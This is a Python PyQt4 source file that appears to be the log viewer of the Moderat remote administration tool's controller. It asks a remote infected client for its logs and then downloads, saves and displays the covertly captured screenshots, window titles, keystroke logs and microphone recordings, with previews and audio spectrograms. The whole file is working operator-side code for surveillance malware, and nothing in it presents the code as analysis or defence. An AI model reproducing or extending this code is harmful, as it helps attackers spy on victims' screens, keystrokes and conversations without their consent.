import main_ui
from PyQt4.QtGui import *
from PyQt4.QtCore import *

import os

from libs.wav_factory import spectrum_analyzer_image, audio_duration


class mainPopup(QWidget, main_ui.Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)
        self.anim = QPropertyAnimation(self, 'windowOpacity')
        self.anim.setDuration(500)
        self.anim.setStartValue(0)
        self.anim.setEndValue(1)
        self.anim.start()

        self.moderat = args['moderat']
        self.client_id = args['client']
        self.client_alias = args['alias']
        self.client_ip_address = args['ip_address']
        self.module_id = args['module_id']
        self.p2p = args['p2p']

        title_prefix = self.client_alias if len(self.client_alias) > 0 else self.client_ip_address
        self.setWindowTitle(u'[{}] {}'.format(title_prefix, self.moderat.MString('VIEWER_WINDOW_TITLE')))

        self.plots = {}

        # resize audio.spectrum column
        self.audioTable.setColumnWidth(1, 570)

        self.date = str(self.timeCalendar.selectedDate().toPyDate())

        # update gui
        self.gui = QApplication.processEvents

        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

        # Triggers
        self.timeCalendar.clicked.connect(self.check_data_counts)
        self.downloadButton.clicked.connect(self.download_logs)

        self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
        self.keylogsTable.doubleClicked.connect(self.open_keylog)
        self.audioTable.doubleClicked.connect(self.open_audio)

        # Init
        self.init_ui()
        self.set_language()
        self.check_data_counts()

    def signal(self, data):
        self.callback(data)

    def init_ui(self):
        self.clientIdLine.setText(self.client_id)
        self.clientAliasLine.setText(self.client_alias)
        self.clientIpLine.setText(self.client_ip_address)

        # Hide Progress Bar
        self.downloadProgress.setHidden(True)
        self.downloadedLabel.setHidden(True)

        # Hide Path Columns
        self.screenshotsTable.setColumnHidden(2, True)
        self.keylogsTable.setColumnHidden(2, True)
        self.audioTable.setColumnHidden(3, True)

    def set_language(self):
        self.logsTab.setTabText(0, self.moderat.MString('VIEWER_SCREENSHOTS_TAB'))
        self.logsTab.setTabText(1, self.moderat.MString('VIEWER_KEYLOGS_TAB'))
        self.logsTab.setTabText(2, self.moderat.MString('VIEWER_AUDIO_TAB'))
        self.screenshotsTable.horizontalHeaderItem(0).setText(self.moderat.MString('VIEWER_SCREENSHOT_PREVIEW'))
        self.screenshotsTable.horizontalHeaderItem(1).setText(self.moderat.MString('VIEWER_SCREENSHOT_INFO'))
        self.keylogsTable.horizontalHeaderItem(0).setText(self.moderat.MString('VIEWER_KEYLOGS_DATETIME'))
        self.keylogsTable.horizontalHeaderItem(1).setText(self.moderat.MString('VIEWER_KEYLOGS_INFO'))
        self.audioTable.horizontalHeaderItem(0).setText(self.moderat.MString('VIEWER_AUDIO_DURATION'))
        self.audioTable.horizontalHeaderItem(1).setText(self.moderat.MString('VIEWER_AUDIO_SPECTRUM'))
        self.audioTable.horizontalHeaderItem(2).setText(self.moderat.MString('VIEWER_AUDIO_DATETIME'))
        self.clientIdLabel.setText(self.moderat.MString('VIEWER_CLIENT_ID'))
        self.clientAliasLabel.setText(self.moderat.MString('VIEWER_CLIENT_ALIAS'))
        self.clientIpLabel.setText(self.moderat.MString('VIEWER_CLIENT_IP'))
        self.downloadGroup.setTitle(self.moderat.MString('VIEWER_DOWNLOAD_GROUP_TITLE'))
        self.ignoreViewedCheck.setText(self.moderat.MString('VIEWER_IGNOR_VIEWED'))
        self.downloadButton.setText(self.moderat.MString('VIEWER_DOWNLOAD'))

    def check_data_counts(self):
        '''
        Send Count Logs Signal
        :return:
        '''
        self.update_date()
        self.moderat.send_message('%s %s' % (self.client_id, self.date),
                                  'countData',
                                  session_id=self.moderat.session_id,
                                  module_id=self.module_id,
                                  p2p=self.p2p)
        self.callback = self.recv_data_counts

    def recv_data_counts(self, data):
        '''
        Receive Count Logs
        @:type data: dict
        :param data: received data
        :return: Set Count in Labels
        '''
        counted_logs = data['payload']
        self.screenshotsCountNewLabel.setText(str(counted_logs['screenshots']['new']))
        self.screenshotsCountOldLabel.setText(str(counted_logs['screenshots']['old']))
        self.keylogsCountNewLabel.setText(str(counted_logs['keylogs']['new']))
        self.keylogsCountOldLabel.setText(str(counted_logs['keylogs']['old']))
        self.audioCountNewLabel.setText(str(counted_logs['audio']['new']))
        self.audioCountOldLabel.setText(str(counted_logs['audio']['old']))

    def update_date(self):
        '''
        :return: Update Global Date Variable
        '''
        self.date = str(self.timeCalendar.selectedDate().toPyDate())

    def open_screenshot(self):
        '''
        :return: Open Screenshot In System Default Image Viewer
        '''
        current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
        os.startfile(current_screenshot_path)

    def open_keylog(self):
        '''
        :return: Open Keylogs In System Default Browser
        '''
        current_keylog_path = str(self.keylogsTable.item(self.keylogsTable.currentRow(), 2).text())
        os.startfile(current_keylog_path)

    def open_audio(self):
        '''
        :return: Open Audio In System Default Audio Player
        '''
        current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 3).text())
        os.startfile(current_audio_path)


    def download_logs(self):
        self.update_date()
        download_info = {
            'screenshot': self.screenshotsEnableButton.isChecked(),
            'keylog': self.keylogsEnableButton.isChecked(),
            'audio': self.audioEnableButton.isChecked(),
            'filter': self.ignoreViewedCheck.isChecked(),
            'client_id': self.client_id,
            'date': self.date,
        }
        # Init Dirs
        self.screenshots_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'SCREENSHOTS')
        self.keylogs_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'KEYLOGS')
        self.audios_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
        self.spectrums_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
        if not os.path.exists(self.screenshots_dir):
            os.makedirs(self.screenshots_dir)
        if not os.path.exists(self.keylogs_dir):
            os.makedirs(self.keylogs_dir)
        if not os.path.exists(self.audios_dir):
            os.makedirs(self.audios_dir)

        self.moderat.send_message(download_info,
                                  'downloadLogs',
                                  module_id=self.module_id,
                                  session_id=self.moderat.session_id,
                                  p2p=self.p2p)
        self.callback = self.recv_download_logs

    def recv_download_logs(self, data):
        self.downloading_screenshots_count = data['payload']['screenshots']
        self.downloaded_screenshots = 0
        self.downloading_keylogs_count = data['payload']['keylogs']
        self.downloaded_keylogs = 0
        self.downloading_audios_count = data['payload']['audios']
        self.downloaded_audios = 0
        # Prepar Progress Bar
        self.downloadProgress.setHidden(False)
        self.downloadedLabel.setHidden(False)
        self.callback = self.recv_log

    def recv_log(self, data):
        type = data['payload']['type']
        if type == 'screenshot':
            self.downloaded_screenshots += 1
            self.downloadProgress.setValue(self.downloaded_screenshots*100/self.downloading_screenshots_count)
            self.downloadedLabel.setText('Downloaded {screenshot} Screenshots From {screenshots}'.format(
                screenshot=self.downloaded_screenshots,
                screenshots=self.downloading_screenshots_count
            ))

            self.screenshotsTable.setRowCount(self.downloading_screenshots_count)

            # Generate File
            path = os.path.join(self.screenshots_dir, data['payload']['datetime']+'.png')
            if not os.path.exists(path):
                with open(path, 'wb') as screenshot_file:
                    screenshot_file.write(data['payload']['raw'])

            # add screenshot preview
            image = QImage(path)
            pixmap = QPixmap.fromImage(image)
            previews_dict = QLabel()
            previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
            previews_dict.setScaledContents(True)
            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 0, previews_dict)

            # add screenshot information
            payload = '''
            <p align="center"><font color="#e67e22">%s</font></p>
            %s
            ''' % (data['payload']['datetime'], data['payload']['window_title'])
            infoText = QTextEdit()
            infoText.setReadOnly(True)
            infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
            infoText.insertHtml(payload)
            self.screenshotsTable.setCellWidget(self.downloaded_screenshots-1, 1, infoText)

            # add path
            item = QTableWidgetItem(path)
            self.screenshotsTable.setItem(self.downloaded_screenshots-1, 2, item)

        elif type == 'keylog':
            self.downloaded_keylogs += 1
            self.downloadProgress.setValue(self.downloaded_keylogs*100/self.downloading_keylogs_count)
            self.downloadedLabel.setText('Downloaded {keylog} Keylog From {keylogs}'.format(
                keylog=self.downloaded_keylogs,
                keylogs=self.downloading_keylogs_count
            ))

            # Generate File
            path = os.path.join(self.keylogs_dir, data['payload']['datetime']+'.html')
            if not os.path.exists(path):
                with open(path, 'wb') as screenshot_file:
                    screenshot_file.write(data['payload']['raw'])

            self.keylogsTable.setRowCount(self.downloading_keylogs_count)
            # Add Data
            item = QTableWidgetItem(data['payload']['datetime'])
            item.setTextColor(QColor('#f39c12'))
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 0, item)

            # Add Preview
            keylog_preview = open(path, 'r').readline()
            item = QTableWidgetItem(keylog_preview)
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 1, item)

            # Add Path
            item = QTableWidgetItem(path)
            self.keylogsTable.setItem(self.downloaded_keylogs-1, 2, item)

        elif type == 'audio':
            self.downloaded_audios += 1
            self.downloadProgress.setValue(self.downloaded_audios*100/self.downloading_audios_count)
            self.downloadedLabel.setText('Downloaded {audio} Audio From {audios}'.format(
                audio=self.downloaded_audios,
                audios=self.downloading_audios_count
            ))

            # Generate File
            path = os.path.join(self.audios_dir, data['payload']['datetime']+'.wav')
            if not os.path.exists(path):
                with open(path, 'wb') as audio_file:
                    audio_file.write(data['payload']['raw'])

            self.audioTable.setRowCount(self.downloading_audios_count)

            # Add Audio Duration
            item = QTableWidgetItem(audio_duration(path))
            item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
            item.setTextColor(QColor('#16a085'))
            self.audioTable.setItem(self.downloaded_audios-1, 0, item)

            # Add Spectrum
            generated_spectrum = spectrum_analyzer_image(path, data['payload']['datetime'], self.spectrums_dir)
            image = QImage(generated_spectrum)
            pixmap = QPixmap.fromImage(image)
            spectrum_image = QLabel()
            spectrum_image.setStyleSheet('background: none;')
            spectrum_image.setPixmap(pixmap)
            self.audioTable.setCellWidget(self.downloaded_audios-1, 1, spectrum_image)

            # add date time
            item = QTableWidgetItem(data['payload']['datetime'])
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            item.setTextColor(QColor('#f39c12'))
            self.audioTable.setItem(self.downloaded_audios-1, 2, item)

            # add path
            item = QTableWidgetItem(path)
            self.audioTable.setItem(self.downloaded_audios-1, 3, item)

        else:
            # Prepar Progress Bar
            self.downloadProgress.setHidden(True)
            self.downloadedLabel.setHidden(True)
            self.downloaded_screenshots = 0
            self.downloaded_keylogs = 0
            self.downloaded_audios = 0
            self.check_data_counts()